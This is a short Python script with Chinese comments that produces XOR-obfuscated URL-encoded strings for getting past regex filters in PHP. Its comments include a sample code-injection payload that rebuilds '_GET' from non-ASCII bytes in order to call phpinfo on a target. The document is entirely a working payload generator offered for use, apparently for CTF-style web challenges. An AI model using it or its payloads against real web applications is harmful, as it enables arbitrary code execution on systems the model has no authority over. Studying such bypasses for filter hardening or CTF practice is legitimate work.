import re
#此脚本为php正则绕过脚本。
#简单示例?code=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo
#运行脚本后，在输入框输入你想要的到的字符。即可通过%ff取反对撞出来
#此脚本对撞出的字符，都是单字节但是其对应ascii码大于127的字符。放心食用即可


# php_re绕过脚本_可用_异或

len_1 = 0xff

start = input('输入')
result = ''
result2 = ''

for y in start:
    for x in range(255):
        if (ord(y) == x^len_1):
            last = '%'+hex(x)[2:]
            # print(last)
            result += last
            result2 += r'%ff'
print(result)
print(result2)


